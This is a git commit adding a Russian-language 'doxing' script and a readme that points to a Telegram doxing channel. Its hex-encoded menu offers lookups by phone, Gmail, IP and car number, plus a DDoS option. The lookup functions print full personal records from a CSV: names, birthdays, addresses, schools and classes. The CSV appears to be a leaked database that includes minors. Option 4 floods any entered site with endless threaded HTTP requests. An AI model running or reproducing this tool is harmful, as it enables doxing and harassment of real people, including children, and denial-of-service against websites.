53f4746b48845fca2eb2b5c3a27dd872f5c59e2e
mendeleev1337 <117925061+mendeleev1337@users.noreply.github.com>
2023-10-04 19:18:17 +0500

    upload @ GitDesktopMod

---
+++ main.py
@@ -0,0 +1,196 @@
+banner = bytearray.fromhex("200AE29680E29688E29680E28083E29688E29680E29680E28083E29688E29680E29688E28083E29688E29680E29688E28083E29688E29680E29688E280830AE29691E29688E29691E28083E29688E29688E29684E28083E29688E29680E29684E28083E29688E29684E29688E28083E29688E29680E29684E280830A0AE29688E29688E29688E29688E29688E29688E29597E29691E29688E29688E29688E29597E29691E29691E29688E29688E29597E29688E29688E29688E29597E29691E29691E29688E29688E295970AE29688E29688E29594E29590E29590E29688E29688E29597E29688E29688E29688E29688E29597E29691E29688E29688E29591E29688E29688E29688E29688E29597E29691E29688E29688E295910AE29688E29688E29591E29691E29691E29688E29688E29591E29688E29688E29594E29688E29688E29597E29688E29688E29591E29688E29688E29594E29688E29688E29597E29688E29688E295910AE29688E29688E29591E29691E29691E29688E29688E29591E29688E29688E29591E2959AE29688E29688E29688E29688E29591E29688E29688E29591E2959AE29688E29688E29688E29688E295910AE29688E29688E29688E29688E29688E29688E29594E2959DE29688E29688E29591E29691E2959AE29688E29688E29688E29591E29688E29688E29591E29691E2959AE29688E29688E29688E295910AE2959AE29590E29590E29590E29590E29590E2959DE29691E2959AE29590E2959DE29691E29691E2959AE29590E29590E2959DE2959AE29590E2959DE29691E29691E2959AE29590E29590E2959D0A0AE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296AC0A20202020205B54656C656772616D206368616E6E656C20406C6F676F766F5F646F786572615D205BD09BD0B8D187D0BAD0B020D0BAD0BED0B4D0B5D180D0B020405465706F707563545F506F636375755D0AE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296AC0A0A202020202020202020202020202020202020202020202020202020202020D09FD09ED094D09FD098D0A1D0ABD092D090D099D0A1D0AF20D09DD09020D0A2D093D09A210A0AE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296AC0A202020202020202020202020202020202020202020202020202020202020D092D18BD0B1D0B5D180D0B5D182D0B520D0BED0BFD186D0B8D18E0AE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296ACE296AC0AE280A22D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2DE280A20A7C5B315D20D09FD180D0BED0B1D0B8D0B220D0BFD0BE20D0BDD0BED0BCD0B5D180D18320D182D0B5D0BBD0B5D184D0BED0BDD0B02020202020202020202020205B345D20D094D0B4D0BED18120D0B0D182D0B0D0BAD0B020202020202020202020202020207C0A7C2020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020207C0A7C5B325D20D09FD180D0BED0B1D0B8D0B220D0BFD0BE20476D61696C202020202020202020202020202020202020202020205B355D20D09FD180D0BED0B1D0B8D0B220D0BFD0BE20D0BDD0BED0BCD0B5D180D18320D0BCD0B0D188D0B8D0BDD18B207C0A7C5B335D20D09FD180D0BED0B1D0B8D0B220D0BFD0BE204950202020202020202020202020202020202020202020202020205B365D20D092D18BD0B9D182D0B820D0B8D0B720D183D182D0B8D0BBD0B8D182D18B20202020202020207C0AE280A22D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2DE280A2").decode("utf-8")
+
+from pystyle import *
+import socket
+import requests
+import threading
+
+COLOR_CODE = {
+    "RESET": "\033[0m",  
+    "UNDERLINE": "\033[04m", 
+    "GREEN": "\033[32m",     
+    "YELLOW": "\033[93m",    
+    "RED": "\033[31m",       
+    "CYAN": "\033[36m",     
+    "BOLD": "\033[01m",        
+    "PINK": "\033[95m",
+    "URL_L": "\033[36m",       
+    "LI_G": "\033[92m",      
+    "F_CL": "\033[0m",
+    "DARK": "\033[90m",     
+}
+
+def get_number(database_file, search_value):
+    found = False
+
+    with open(database_file, 'r', encoding='utf-8') as file:
+        lines = file.readlines()
+
+    for line in lines:
+        data = line.strip().split(';')  
+        if len(data) >= 8:
+            phone = data[7]
+            if search_value in phone:
+                user_id = data[0]
+                registration_date = data[1]
+                last_name = data[2]
+                first_name = data[3]
+                middle_name = data[4]
+                birthday = data[5]
+                gender = data[6]
+                email = data[8]
+                role = data[9]
+                class_name = data[13]
+                address = data[19]
+                country = data[16]
+                citizenship = data[15]
+                region = data[17]  
+                municipal_education = data[18]  
+                institution_name = data[20]  
+
+                print(f'''{COLOR_CODE["GREEN"]}
+╔══════                                               ══════╗
+║                                                           ║
+                {COLOR_CODE["GREEN"]}[+]ID пользователя: {user_id}
+                [+]Дата регистрации: {registration_date}
+                [+]Фамилия: {last_name}
+                [+]Имя: {first_name}
+                [+]Отчество: {middle_name}
+                [+]Дата рождения: {birthday}
+                [+]Пол: {gender}
+                [+]Телефон: {phone}
+                [+]Почта: {email}
+                [+]Роль: {role}
+                [+]Класс: {class_name}
+                [+]Адрес: {address}
+                [+]Страна: {country}
+                [+]Гражданство: {citizenship}
+                [+]Регион: {region} 
+                [+]Муниципальное образование: {municipal_education}  
+                [+]Наименование учреждения: {institution_name}  
+
+                {COLOR_CODE["GREEN"]}
+║                                                           ║
+╚══════                                               ══════╝
+                     
+                      ''')
+                found = True
+
+    if not found:
+        print(f'{COLOR_CODE["PINK"]}Ничего не найдено. ВВЕДИТЕ КОМАНДУ python main.py что бы вернуться в главное меню')
+
+def get_mail(database_file, search_value):
+    found = False
+
+    with open(database_file, 'r', encoding='utf-8') as file:
+        lines = file.readlines()
+
+    for line in lines:
+        data = line.strip().split(';')  
+        if len(data) >= 8:
+            email = data[8]
+            if search_value in email:
+                user_id = data[0]
+                registration_date = data[1]
+                last_name = data[2]
+                first_name = data[3]
+                middle_name = data[4]
+                birthday = data[5]
+                gender = data[6]
+                phone = data[7]
+                role = data[9]
+                class_name = data[13]
+                address = data[19]
+                country = data[16]
+                citizenship = data[15]
+                region = data[17]  
+                municipal_education = data[18]  
+                institution_name = data[20]  
+
+                print(f'''{COLOR_CODE["GREEN"]}
+╔══════                                               ══════╗
+║                                                           ║
+                {COLOR_CODE["GREEN"]}[+]ID пользователя: {user_id}
+                [+]Дата регистрации: {registration_date}
+                [+]Фамилия: {last_name}
+                [+]Имя: {first_name}
+                [+]Отчество: {middle_name}
+                [+]Дата рождения: {birthday}
+                [+]Пол: {gender}
+                [+]Телефон: {phone}
+                [+]Почта: {email}
+                [+]Роль: {role}
+                [+]Класс: {class_name}
+                [+]Адрес: {address}
+                [+]Страна: {country}
+                [+]Гражданство: {citizenship}
+                [+]Регион: {region} 
+                [+]Муниципальное образование: {municipal_education}  
+                [+]Наименование учреждения: {institution_name}  
+
+                {COLOR_CODE["GREEN"]}
+║                                                           ║
+╚══════                                               ══════╝
+                     
+                      ''')
+                found = True
+
+    if not found:
+        print(f'{COLOR_CODE["PINK"]} Ничего не удалось найти в базе, введите python main.py что бы вернуться в главное меню.')
+def get_ip():
+    ip = input(f'{COLOR_CODE["GREEN"]}[!]Введите айпи:' )
+
+    try:
+        ip = socket.gethostbyname(ip)
+        
+        infoList1 = requests.get(f"http://ipwho.is/{ip}")
+        infoList = infoList1.json()
+        
+        if infoList.get("success"):
+            print(f'{COLOR_CODE["GREEN"]}╔══════════════                     ══════════════╗\n')
+            print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Айпи адресс:{COLOR_CODE["YELLOW"]}  {infoList["ip"]}')
+            print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Успех:{COLOR_CODE["YELLOW"]}  {infoList["success"]}  ')
+            print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Тип:{COLOR_CODE["YELLOW"]}   {infoList["type"]}     ')
+            print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Континент:{COLOR_CODE["YELLOW"]}   {infoList["continent"]}')
+            print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Страна:{COLOR_CODE["YELLOW"]}   {infoList["country"]}')
+            print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Регион:{COLOR_CODE["YELLOW"]}   {infoList["region"]}')
+            print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Город:{COLOR_CODE["YELLOW"]}   {infoList["city"]}')
+            print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Почтовый код:{COLOR_CODE["YELLOW"]}   {infoList["postal"]}')
+            print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Столица:{COLOR_CODE["YELLOW"]}  {infoList["capital"]}\n')
+            print(f'{COLOR_CODE["RED"]}╚══════════════                     ══════════════╝\n')
+
+            
+        else:
+            print(f'{COLOR_CODE["RED"]}╔══════════════                     ══════════════╗\n')
+            print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} IP:{COLOR_CODE["YELLOW"]}  {infoList["ip"]}')
+            print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Success:{COLOR_CODE["YELLOW"]}   {infoList["success"]}')
+            print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Message:{COLOR_CODE["YELLOW"]}  {infoList["message"]}')
+            print(f'{COLOR_CODE["RED"]}╚══════════════                     ══════════════╝\n')
+    except Exception as e:
+        print(f'An error occurred: {e}')
+ 
+def dos():
+    while True:
+        requests.get(link)
+
+print(Colorate.Horizontal(Colors.green_to_white,Center.XCenter(banner)))
+select = input(f'{COLOR_CODE["RED"]}[+]{COLOR_CODE["BOLD"]} Выбрать >{COLOR_CODE["GREEN"]} ')
+if select == '1':
+    database_file = 'Terordnn.csv' 
+    search_value = input(f'{COLOR_CODE["YELLOW"]}[!]Введите номер телефона обидчика:')
+    get_number(database_file, search_value)
+elif select == '2':
+    database_file = 'Terordnn.csv' 
+    search_value = input(f'{COLOR_CODE["YELLOW"]}[!]Введите gmail почту:')
+    get_mail(database_file, search_value)
+elif select == '3':
+    get_ip()
+elif select =='4':
+    link = input('Введите адрес сайта на который хотите совершить ddos атаку: ')
+    dos()
+    while True:
+        threading.Thread(target=dos).start()
+elif select == '5':
+    print('Временно не доступно')
+elif select =='6':
+    exit
---
+++ readme.md
@@ -0,0 +1,6 @@
+тутор тут https://t.me/logovo_doxera
+тутор тут https://t.me/logovo_doxera
+тутор тут https://t.me/logovo_doxera
+
+
+pip install -r req.txt
